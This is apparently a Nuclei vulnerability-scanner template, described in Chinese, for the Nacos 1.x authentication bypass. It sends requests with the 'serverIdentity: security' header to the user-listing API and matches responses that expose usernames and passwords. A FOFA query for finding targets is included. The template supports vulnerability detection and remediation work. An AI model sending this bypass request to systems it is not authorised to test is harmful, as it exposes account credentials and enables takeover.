id: nacos-auth-bypass

info:
  name: Nacos 1.x - 认证绕过漏洞
  author: taielab,pikpikcu,SleepingBag945
  severity: critical
  description: |
    该模板用于检测 Nacos 1.x - 认证绕过漏洞。该类漏洞通常源于认证、授权或会话校验逻辑不完整，使未授权用户可访问受保护接口或执行敏感操作。模板会向 `/nacos/v1/auth/users?pageNo=1&pageSize=9`、`/v1/auth/users?pageNo=1&pageSize=9` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可绕过登录或权限限制，访问管理功能、敏感数据或业务操作接口。
    - 在管理接口暴露的场景下，可能进一步导致配置被篡改、账号被接管或系统被植入后门。
  remediation: |
    - 在服务端统一执行认证和授权校验，避免仅依赖前端控制或可预测参数。
    - 修复存在绕过问题的版本，并限制管理接口、调试接口和敏感 API 的访问来源。
    - 审计异常登录、权限变更和配置修改记录，轮换可能受影响的账号凭据。
  reference:
    - https://github.com/alibaba/nacos/issues/4593
    - https://nacos.io/en-us/docs/auth.html
    - https://nacos.io/docs/latest/guide/user/auth/
    - https://nacos.io/blog/faq/nacos-user-question-history15416/
  classification:
    cwe-id: CWE-290
    cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: alibaba
    product: nacos
    fofa-query: app="NACOS"
  tags: nacos,auth-bypass,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9"
      - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=9"

    headers:
      serverIdentity: security
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"totalCount":'
          - '"username":'
          - '"password":'
          - '"pagesAvailable":'
        condition: and

      - type: word
        part: header
        words:
          - application/json

      - type: status
        status:
          - 200
